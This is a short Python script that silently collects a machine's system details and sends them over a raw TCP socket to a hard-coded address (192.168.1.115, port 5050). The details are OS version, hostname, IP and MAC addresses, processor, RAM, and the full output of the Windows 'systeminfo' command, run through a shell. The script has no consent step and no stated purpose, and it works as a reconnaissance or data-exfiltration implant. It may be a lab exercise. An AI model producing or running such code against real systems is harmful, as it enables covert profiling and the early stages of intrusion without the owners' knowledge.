from socket import *
import platform,socket,re,uuid,json,psutil,logging
import subprocess

def getSystemInfo():
    try:
        info={}
        info['platform']=platform.system()
        info['platform-release']=platform.release()
        info['platform-version']=platform.version()
        info['architecture']=platform.machine()
        info['hostname']=socket.gethostname()
        info['ip-address']=socket.gethostbyname(socket.gethostname())
        info['mac-address']=':'.join(re.findall('..', '%012x' % uuid.getnode()))
        info['processor']=platform.processor()
        info['ram']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return json.dumps(info)
    except Exception as e:
        logging.exception(e)

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.115",5050))

data1 = str(subprocess.check_output("systeminfo",shell=True,stderr=subprocess.STDOUT))
data2 = str(json.loads(getSystemInfo()))

s.send((data1+"\n"+data2).encode("utf-8"))
s.close()